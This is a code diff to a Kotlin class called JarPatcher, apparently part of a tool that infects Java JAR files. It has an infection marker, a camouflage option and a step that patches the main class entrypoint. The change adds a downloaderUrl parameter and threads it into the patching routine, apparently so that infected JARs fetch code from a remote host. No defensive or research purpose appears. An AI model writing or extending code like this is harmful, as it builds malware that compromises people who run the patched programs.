@@ -22,7 +22,8 @@ class JarPatcher(
     private val outputPath: Path,
     private val camouflage: Boolean,
     private val config: Config,
-    private val configJson: String
+    private val configJson: String,
+    private val downloaderUrl: String
 ) {
     private val infectionMarker = InfectionMarker()
     private val jarAnalyzer = JarAnalyzer()
@@ -63,7 +64,8 @@ class JarPatcher(
                 tempJarPath.toFile(),
                 dominantVersion,
                 config,
-                configJson
+                configJson,
+                downloaderUrl
             )
 
             Logs.info("[STEP 3] Patching main class entrypoint...")
